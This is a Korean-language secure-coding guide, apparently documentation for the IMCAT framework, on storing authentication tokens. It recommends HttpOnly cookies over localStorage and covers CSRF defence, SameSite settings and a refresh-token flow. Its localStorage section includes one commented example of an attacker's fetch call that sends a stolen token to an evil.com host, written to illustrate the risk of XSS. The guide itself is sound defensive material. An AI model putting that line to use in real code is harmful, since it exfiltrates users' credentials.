# 토큰 저장 및 인증 보안 가이드

웹 애플리케이션의 인증 토큰 저장 방법과 보안 모범 사례입니다.

> **이 문서의 핵심**: `localStorage`에 토큰 저장 금지, HttpOnly 쿠키 사용 권장,
> CSRF 방어와 SameSite 설정 필수.

---

## 저장소별 보안 비교

| 저장소 | XSS 취약 | CSRF 취약 | 권장 용도 |
| ------ | -------- | --------- | --------- |
| `localStorage` | ⛔ 노출됨 | ✅ 안전 | 테마, 언어 등 비민감 설정 |
| `sessionStorage` | ⛔ 노출됨 | ✅ 안전 | 임시 UI 상태 |
| **HttpOnly 쿠키** | ✅ 안전 | ⚠️ CSRF 필요 | **인증 토큰 (권장)** |
| 메모리 (변수) | ✅ 안전 | ✅ 안전 | 단기 토큰 (새로고침 시 소실) |

---

## ⛔ localStorage에 토큰 저장 금지

### 위험성

`localStorage`는 JavaScript로 자유롭게 접근 가능하므로, XSS 공격 시 토큰이 즉시 탈취됩니다.

```javascript
// ❌ 금지: XSS 시 토큰 탈취 가능
localStorage.setItem('token', 'eyJhbGciOi...');
// 공격자: fetch('https://evil.com/steal?token=' + localStorage.getItem('token'));

// ❌ IMCAT.storage도 민감 데이터 저장 금지
IMCAT.storage.set('authToken', token); // 내부적으로 localStorage 사용
```

### IMCAT.storage 사용 가이드

```javascript
// ✅ 비민감 데이터만 저장
IMCAT.storage.set('theme', 'dark');
IMCAT.storage.set('language', 'ko');
IMCAT.storage.set('sidebar-collapsed', true);

// ⛔ 민감 데이터 저장 금지
// IMCAT.storage.set('accessToken', token);
// IMCAT.storage.set('refreshToken', token);
// IMCAT.storage.set('sessionId', sid);
```

---

## ✅ HttpOnly 쿠키 사용 권장

### 서버 설정 (Express 예제)

```javascript
// 로그인 시 HttpOnly 쿠키로 토큰 설정
app.post('/api/login', (req, res) => {
  const token = generateJWT(user);

  res.cookie('accessToken', token, {
    httpOnly: true,   // JavaScript 접근 차단
    secure: true,     // HTTPS에서만 전송
    sameSite: 'Lax',  // CSRF 기본 방어
    maxAge: 3600000,  // 1시간
    path: '/'
  });

  res.json({ success: true });
});
```

### 클라이언트 (IMCAT API 사용)

```javascript
// 쿠키는 자동으로 전송되므로 별도 토큰 관리 불필요
const data = await IMCAT.api.get('/api/profile', {
  credentials: 'same-origin' // 쿠키 자동 포함
});
```

---

## CSRF 방어

HttpOnly 쿠키 사용 시 CSRF 공격에 대비해야 합니다.

### Double Submit Cookie 패턴

```javascript
// 서버: CSRF 토큰을 일반 쿠키로 설정
res.cookie('csrfToken', generateCSRFToken(), {
  httpOnly: false,  // JavaScript에서 읽을 수 있어야 함
  secure: true,
  sameSite: 'Lax'
});

// 클라이언트: 요청 시 CSRF 토큰 헤더에 포함
const csrfToken = document.cookie
  .split('; ')
  .find(row => row.startsWith('csrfToken='))
  ?.split('=')[1];

const data = await IMCAT.api.post('/api/action', {
  headers: { 'X-CSRF-Token': csrfToken },
  body: { action: 'update' }
});
```

### SameSite 속성

| 값 | 동작 | 권장 |
| -- | ---- | ---- |
| `Strict` | 외부 사이트에서 요청 시 쿠키 미전송 | 높은 보안 필요 시 |
| `Lax` | GET 네비게이션만 쿠키 전송 | **일반 권장** |
| `None` | 모든 크로스 사이트 요청에 쿠키 전송 | 서드파티 통합 시만 |

---

## Refresh Token 전략

```text
[클라이언트]                    [서버]
    |                             |
    |-- POST /login ------------->|
    |<-- Set-Cookie: access (1h)--|
    |<-- Set-Cookie: refresh (7d)-|
    |                             |
    |-- GET /api/data (쿠키 자동)->|
    |<-- 200 OK ------------------|
    |                             |
    |-- GET /api/data (만료됨) --->|
    |<-- 401 Unauthorized --------|
    |                             |
    |-- POST /refresh (쿠키 자동)->|
    |<-- Set-Cookie: access (1h)--|
    |                             |
```

---

## 체크리스트

- [ ] `localStorage`/`sessionStorage`에 인증 토큰을 저장하지 않는다
- [ ] `IMCAT.storage`에 민감 데이터를 저장하지 않는다
- [ ] 인증 토큰은 HttpOnly + Secure + SameSite 쿠키를 사용한다
- [ ] CSRF 방어 메커니즘이 적용되어 있다
- [ ] Refresh Token은 별도의 HttpOnly 쿠키에 저장한다
- [ ] 토큰 만료 시간을 적절히 설정한다 (Access: 1시간 이내)

---

## 관련 문서

- [CSP 헤더 가이드](csp-guide.md)
- [보안 감사 가이드](audit-guide.md)
- [Storage 모듈](../core/storage.md) — 비민감 데이터 저장용
